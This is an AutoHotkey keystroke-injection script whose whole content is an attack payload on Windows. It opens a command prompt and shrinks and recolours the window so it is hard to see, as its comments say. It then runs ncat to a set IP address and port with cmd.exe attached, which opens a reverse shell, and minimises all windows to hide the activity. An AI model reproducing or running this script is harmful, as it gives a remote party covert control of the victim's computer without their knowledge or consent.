#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

Goto, Payload

Payload:
Sleep, 1000
Send #r ; Run prompt
Sleep, 1000
Send cmd ; Opens Command Prompt
Send {Enter}
Sleep, 1000
Send mode con:cols=18 lines=1 ; Obfuscation, sets the window tho smallest possible size 
Send {Enter}
Sleep, 100
Send color FE ; This makes the text hard to read
Send {Enter}
Sleep, 100
Send ncat.exe 192.168.1.16 1436 -e cmd.exe ; This makes the connection, set IP and port as needed
Send {Enter}
Sleep, 100
Send #d ; This minimizes all apps, hiding the window.